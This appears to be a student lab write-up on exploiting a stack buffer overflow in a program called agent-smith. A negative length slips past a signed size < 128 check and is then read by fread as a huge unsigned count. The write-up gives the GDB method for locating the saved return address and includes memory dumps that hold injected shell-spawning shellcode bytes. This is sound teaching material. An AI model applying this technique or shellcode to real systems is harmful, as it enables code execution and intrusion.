Vulnerability: The buffer overflow problem was "fixed" by not allowing strings of length greater than 128.
However, size is declared as a signed integer, so it does not check for negative lengths.

How it can be exploited: To allow us to overflow the buffer with the additional check of size < 128 (signed),
we can provide a negative size. Becaues fread takes in the number of elements as a size_t (unsigned), the 
argument is treated as a very large positive number causing us to read a lot more bytes than the length of
the buffer, therefore overflowing the buffer.

How we determined which address to jump to: Like before, we used info frame in GDB to find the location of 
the RIP, and x/52x to determine the offset from the beginning of the buffer to the RIP. The address of the 
shellcode was determined by where we chose to insert it (immediately after the RIP) when we wrote our egg 
script.

Sketch of Solution: After deteriming the address of the RIP and the offset to it from the beginning of the 
buffer, we overwrote the value of the RIP with the location of the shellcode, such that the shellcode was
executed instead of the original instruction pointed to by the RIP. This is different from the first problem
in that the first byte we write represents the size of our string, due to the input format to agent-smith. 
This allows us to feed in a negative number in order to bypass the size < 128 check in the program.

GDB Output:
Before:
(gdb) info frame
 Stack level 0, frame at 0xbffffdd0:
  eip = 0x80484b5 in display (agent-smith.c:9); saved eip 0x804857b
  called by frame at 0xbffffdf0
  source language c.
  Arglist at 0xbffffdc8, args: path=0xbfffff87 "pwnzerized"
  Locals at 0xbffffdc8, Previous frame's sp is 0xbffffdd0
  Saved registers:
   ebp at 0xbffffdc8, eip at 0xbffffdcc
(gdb) x/52x msg
0xbffffd38:     0x00000001      0xb7fff938      0x00000000      0x00000000
0xbffffd48:     0x00000000      0xb7fd2000      0xbffffd9e      0xbffffd9f
0xbffffd58:     0x00000001      0xb7ec4269      0xbffffd9f      0xbffffd9e
0xbffffd68:     0x00000000      0xb7ff3fdc      0xbffffe24      0x00000000
0xbffffd78:     0x00000000      0xb7e5f043      0x0804828d      0x00000000
0xbffffd88:     0x00c30000      0x00000001      0xbfffff6f      0x0000002f
0xbffffd98:     0xbffffdec      0xb7fd2000      0x08048590      0x080483c0
0xbffffda8:     0x00000000      0x08048335      0xb7fd23e4      0x00008000
0xbffffdb8:     0x0804a000      0x080485e2      0x00000002      0xbffffe84
0xbffffdc8:     0xbffffde8      0x0804857b      0xbfffff87      0x00000000
0xbffffdd8:     0x08048599      0xb7fd2000      0x08048590      0x00000000
0xbffffde8:     0x00000000      0xb7e454d3      0x00000002      0xbffffe84
0xbffffdf8:     0xbffffe90      0xb7fdc858      0x00000000      0xbffffe1c
After:
(gdb) info frame
 Stack level 0, frame at 0xbffffdd0:
  eip = 0x8048545 in display (agent-smith.c:17); saved eip 0xbffffdd0
  called by frame at 0xbffffdd4
  source language c.
  Arglist at 0xbffffdc8, args: path=0x895e1feb <Address 0x895e1feb out of bounds>
  Locals at 0xbffffdc8, Previous frame's sp is 0xbffffdd0
  Saved registers:
   ebp at 0xbffffdc8, eip at 0xbffffdcc
(gdb) x/52x msg
0xbffffd38:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffd48:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffd58:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffd68:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffd78:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffd88:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffd98:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffda8:     0xbffffdcc      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffdb8:     0x000000c6      0xbffffdcc      0xbffffdcc      0xbffffdcc
0xbffffdc8:     0xbffffdcc      0xbffffdd0      0x895e1feb      0xc0310876
0xbffffdd8:     0x89074688      0x0bb00c46      0x4e8df389      0x0c568d08
0xbffffde8:     0xdb3180cd      0xcd40d889      0xffdce880      0x622fffff
0xbffffdf8:     0x732f6e69      0xb7fd0a68      0x00000000      0xbffffe1c